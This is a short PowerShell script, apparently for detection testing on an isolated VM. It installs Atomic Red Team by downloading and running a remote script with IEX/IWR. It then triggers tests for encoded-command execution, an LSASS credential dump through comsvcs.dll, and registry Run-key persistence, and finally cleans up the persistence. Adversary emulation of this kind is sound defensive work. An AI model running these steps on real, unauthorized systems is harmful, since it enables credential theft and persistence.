# =====================================================================
# Required Notice: Copyright (c) 2026 Adam Dryden (Phlotonic) (https://github.com/Phlotonic)
# Dual-Licensed under PolyForm Noncommercial 1.0.0 & Commercial License.
# Commercial or corporate use requires a paid license — see COMMERCIAL-LICENSE.md.
# =====================================================================
# Atomic Red Team Adversary Emulation Script (Isolated Test VM Only)
# =====================================================================
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics -Force

# 1. Trigger Command Execution (T1059.001 - PowerShell Encoded Command)
Invoke-AtomicTest T1059.001 -TestNumbers 1,4

# 2. Trigger Credential Dumping Attempt (T1003.001 - LSASS Memory Dump via comsvcs.dll)
Invoke-AtomicTest T1003.001 -TestNumbers 1,2

# 3. Trigger Persistence Mechanism (T1547.001 - Registry Run Keys Startup Persistence)
Invoke-AtomicTest T1547.001 -TestNumbers 1

# Cleanup Persistence Artifacts After Alert Verification
Invoke-AtomicTest T1547.001 -TestNumbers 1 -Cleanup
